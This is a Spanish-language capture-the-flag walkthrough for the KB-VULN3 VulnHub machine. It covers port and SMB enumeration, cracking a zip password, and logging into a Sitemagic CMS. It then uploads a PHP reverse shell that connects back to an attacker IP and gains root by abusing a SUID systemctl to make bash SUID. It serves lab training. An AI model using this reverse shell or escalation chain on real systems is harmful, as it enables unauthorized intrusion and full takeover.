---
icon: flag
---

# KB-VULN3 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 11:30 CEST
Nmap scan report for 192.168.5.130
Host is up (0.00041s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cb:04:f0:36:3f:42:f7:3a:ce:2f:f5:4c:e0:ab:fe:17 (RSA)
|   256 61:06:df:25:d5:e1:e3:47:fe:13:94:fd:74:0c:85:00 (ECDSA)
|_  256 50:89:b6:b4:3a:0b:6e:63:12:10:40:e2:c4:f9:35:33 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:2D:1B:1C (VMware)
Service Info: Host: KB-SERVER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-07-06T09:30:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: kb-server
|   NetBIOS computer name: KB-SERVER\x00
|   Domain name: \x00
|   FQDN: kb-server
|_  System time: 2024-07-06T09:30:52+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds
```

### enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jul  6 11:32:15 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.5.130
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.5.130 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 192.168.5.130 )===============================

Looking up status of 192.168.5.130
No reply from 192.168.5.130

 ===================================( Session Check on 192.168.5.130 )===================================


[+] Server 192.168.5.130 allows sessions using username '', password ''


 ================================( Getting domain SID for 192.168.5.130 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.5.130 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.5.130 from srvinfo: 
	KB-SERVER      Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 =======================================( Users on 192.168.5.130 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 192.168.5.130 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	Files           Disk      HACK ME
	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            

[+] Attempting to map shares on 192.168.5.130

//192.168.5.130/Files	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.5.130/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.5.130 )===========================



[+] Attaching to 192.168.5.130 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] KB-SERVER
	[+] Builtin

[+] Password Info for Domain: KB-SERVER

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 192.168.5.130 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 192.168.5.130 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\heisenberg (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1549018082-965289578-1641819225 and logon username '', password ''

S-1-5-21-1549018082-965289578-1641819225-501 KB-SERVER\nobody (Local User)
S-1-5-21-1549018082-965289578-1641819225-513 KB-SERVER\None (Domain Group)

 ===============================( Getting printer info for 192.168.5.130 )===============================

No printers returned.


enum4linux complete on Sat Jul  6 11:32:55 2024
```

Encontramos una carpeta compartida que podremos entrar `//192.168.5.130/Files` a parte de que vemos el nombre de un usuario llamado `heisenberg` por lo que haremos lo siguiente...

```shell
smbclient //192.168.5.130/Files -N
```

Dentro del `smb` veremos un archivo `.zip` llamado `website.zip` por lo que nos lo descargaremos...

```shell
get website.zip
```

Si lo intentamos descomprimir veremos que tiene una contarseña, pero si le damos a `enter` nos descomprimira parte del archivo en una carpeta llamada `sitemagic` eso no nos interesa, tendremos que crackear la contraseña por lo que haremos lo siguiente...

```shell
zip2john website.zip > hash
```

```shell
john --wordlist=<WORDIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porchman         (website.zip)     
1g 0:00:00:03 DONE (2024-07-06 11:39) 0.2849g/s 1306Kp/s 1306Kc/s 1306KC/s potweed21..pommagranite
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que la contraseña del archivo `.zip` es `porchman`, por lo que haremos lo siguiente...

```shell
unzip website.zip
```

Metemos esa contraseña y ahora si nos descomprimira todo, por lo que iremos a un archivo dentro de la carpeta que nos llamara mucho la atencion...

```shell
cat sitemagic/config.xml.php
```

Veremos lo siguiente interesante, unas credenciales que podremos usar mas adelante...

```
<!-- REQUIRED, throws custom exception if missing -->
     <entry key="Username" value="admin"/>
 <!-- REQUIRED, throws custom exception if missing -->
     <entry key="Password" value="jesse"/>
```

Vemos que la carpeta a la que entramos se llama `sitemagic` y que contiene una pagina web, a paret de las credenciales que ya encontramos, por lo que si nos vamos a la siguiente `URL` veremos lo siguiente...

```
URL = http://<IP>/sitemagic
```

Esto nos mostrara una pagina web, por lo que iremos al panel de login para logearnos con las cerdenciales que conseguimos...

Una vez logeados, nos iremos al siguiente apartado para poder crearnos una `Reverse Shell`...

```
Content/Files
```

Y ahi dentro veremos una opcion para poder subir un archivo, el cual sera una `Rreverse Shell` de la siguiente manera...

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("/bin/sh", array(0=>$sock,   1=>$sock, 2=>$sock),$pipes);
?>
```

Si lo subimos pinchando en la seccion de `Editor` veremos que la shell se subio perfectamente, por lo que nos iremos en la `URL` a la siguiente ubicacion...

```
URL = http://<IP>/sitemagic/files/
```

Aqui veremos 3 carpetas, como la subimos en `Editor` especificamente o en la que lo hayais subido, entraremos por ejemplo a `Editor` y ahi veremos la `shell.php` que subimos pero antes de darle, tendremos que estar a la escucha...

```shell
nc -lvnp <PORT>
```

Una vez estando a la escucha le daremos a la `shell.php` en la `URL`...

```
URL = http://<IP>/sitemagic/files/editor/shell.php
```

Y con esto ya tendriamos una shell con el usuario `www-data`, por lo que sanitizaremos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la `/home` del usuario `heisenberg` veremos la flag del usuario...

> user.txt (flag1)

```
6346c6d19751f1a3195f1e4b4b609544
```

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
8195    112 -rwsr-xr-x   1 root     root       113528 Sep  4  2020 /usr/lib/snapd/snap-confine
     1254     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7362    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     1068     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     1250    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
     1061     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      442     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
      840    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
      698     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
      699     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
      493     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
      735     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
      588     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
      495     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
      697     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
      715     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
      876     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   524425    180 -rwsr-sr-x   1 root     root         182352 Jul  8  2020 /bin/systemctl
   524577     28 -rwsr-xr-x   1 root     root          26696 Sep 16  2020 /bin/umount
   524423     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
   524554     44 -rwsr-xr-x   1 root     root          43088 Sep 16  2020 /bin/mount
   524356     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   524407     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
```

Veremos la siguiente seccion por la que podremos ser `root`...

```
 524425    180 -rwsr-sr-x   1 root     root    182352 Jul  8  2020 /bin/systemctl
```

URL = https://gtfobins.github.io/gtfobins/systemctl/

Por lo que si hacemos lo siguiente podremos ser `root`...

Antes de nada, en la carpeta tipica de `/tmp` no podremos hacer esta escalada, tendremos que hacerlo en otra carpeta que es como `/tmp` donde si podremos ejecutar los archivos de forma libre `/dev/shm`

```shell
TF=$(mktemp /dev/shm/my-service.XXXXXX.service)
```

```shell
echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod u+s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
```

```shell
systemctl link $TF
```

Ahora veremos como se llama nuestro servicio creado de la siguiente forma...

```shell
ls /dev/shm/my-service*
```

Info:

```
/dev/shm/my-service.pdRid6.service
```

Por lo que si sabemos como se llama nuestro servicio temporal, ya podremos ejecutarlo...

```shell
systemctl enable --now my-service.pdRid6.service
```

Una vez hecho eso y hemos hecho que se pusiera los permisos `SUID` en `/bin/bash` podremos hacer lo siguiente...

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que leeremos la flag...

> root.txt (flag2)

```
                                                                                                      
  ####   ####  #    #  ####  #####    ##   ##### #    # #        ##   ##### #  ####  #    #  ####     
 #    # #    # ##   # #    # #    #  #  #    #   #    # #       #  #    #   # #    # ##   # #        
 #      #    # # #  # #      #    # #    #   #   #    # #      #    #   #   # #    # # #  #  ####     
 #      #    # #  # # #  ### #####  ######   #   #    # #      ######   #   # #    # #  # #      #    
 #    # #    # #   ## #    # #   #  #    #   #   #    # #      #    #   #   # #    # #   ## #    #    
  ####   ####  #    #  ####  #    # #    #   #    ####  ###### #    #   #   #  ####  #    #  #### 
  
                                            kernelblog.org    
                           
                                                                                                                                                                                                   
49360ba4cbe27a1b900df25b247315d7
```
